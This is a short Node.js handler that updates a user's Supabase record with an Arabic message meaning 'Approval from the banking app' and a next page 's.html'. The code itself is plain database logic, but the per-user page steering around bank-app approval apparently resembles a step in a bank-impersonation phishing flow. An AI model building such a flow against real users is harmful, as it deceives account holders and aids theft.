const { supabase, getUserFromReq } = require('./_lib/supabase');

module.exports = async (req, res) => {
  const user = getUserFromReq(req);
  if (!user) return res.json({ success: false });

  await supabase.from('users').update({
    message: 'الموافقة من التطبيق البنكي',
    page: 's.html',
    updated_at: new Date().toISOString()
  }).eq('id', user.userId);

  res.json({ success: true });
};
